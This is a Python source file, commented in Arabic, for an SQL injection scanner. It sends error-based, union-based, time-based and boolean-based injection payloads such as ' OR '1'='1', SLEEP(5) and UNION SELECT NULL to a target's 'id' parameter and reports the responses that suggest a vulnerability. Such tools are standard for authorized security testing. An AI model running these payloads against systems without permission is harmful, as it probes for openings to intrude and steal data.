"""
SQL Injection Scanner
يفحص: Union-based, Boolean-based, Time-based, Error-based
"""

import re
import time
import requests
import urllib.parse
from typing import List, Dict

class SQLInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "admin' --",
                "' UNION SELECT NULL--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--",
            ],
            'boolean_based': [
                "' AND '1'='1",
                "' AND '1'='2",
            ]
        }
        
        # أنماط الأخطاء
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql",
            r"MySQLSyntaxErrorException",
            r"PostgreSQL.*ERROR",
            r"Microsoft SQL Server",
            r"ORA-\d{5}",
            r"SQLite.*error",
        ]
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص SQL Injection: {self.target}")
        
        self._test_error_based()
        self._test_boolean_based()
        self._test_time_based()
        self._test_union_based()
        
        return self.vulnerabilities
    
    def _test_error_based(self):
        """اختبار Error-based SQLi"""
        for payload in self.payloads['error_based']:
            try:
                url = f"{self.target}?id={urllib.parse.quote(payload)}"
                response = requests.get(url, timeout=10)
                
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection (Error-based)',
                            'severity': 'critical',
                            'url': url,
                            'payload': payload,
                            'evidence': response.text[:200]
                        })
                        print(f"  [!] SQL Injection وُجدت! Payload: {payload}")
                        return
            except:
                pass
    
    def _test_boolean_based(self):
        """اختبار Boolean-based Blind SQLi"""
        try:
            baseline = requests.get(self.target, timeout=10)
            baseline_len = len(baseline.text)
            
            true_payload = "' AND '1'='1"
            false_payload = "' AND '1'='2"
            
            true_resp = requests.get(f"{self.target}?id={urllib.parse.quote(true_payload)}", timeout=10)
            false_resp = requests.get(f"{self.target}?id={urllib.parse.quote(false_payload)}", timeout=10)
            
            if abs(len(true_resp.text) - baseline_len) < 100 and abs(len(false_resp.text) - baseline_len) > 100:
                self.vulnerabilities.append({
                    'type': 'SQL Injection (Boolean-based)',
                    'severity': 'high',
                    'url': self.target,
                    'payload': true_payload
                })
                print(f"  [!] Boolean-based SQLi وُجدت!")
        except:
            pass
    
    def _test_time_based(self):
        """اختبار Time-based Blind SQLi"""
        for payload in self.payloads['time_based']:
            try:
                url = f"{self.target}?id={urllib.parse.quote(payload)}"
                start = time.time()
                requests.get(url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    self.vulnerabilities.append({
                        'type': 'SQL Injection (Time-based)',
                        'severity': 'high',
                        'url': url,
                        'payload': payload,
                        'time_delay': elapsed
                    })
                    print(f"  [!] Time-based SQLi وُجدت!")
                    return
            except:
                pass
    
    def _test_union_based(self):
        """اختبار Union-based SQLi"""
        for payload in self.payloads['union_based']:
            try:
                url = f"{self.target}?id={urllib.parse.quote(payload)}"
                response = requests.get(url, timeout=10)
                
                if 'null' in response.text.lower() or 'union' in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'SQL Injection (Union-based)',
                        'severity': 'critical',
                        'url': url,
                        'payload': payload
                    })
                    print(f"  [!] Union-based SQLi محتملة!")
                    return
            except:
                pass
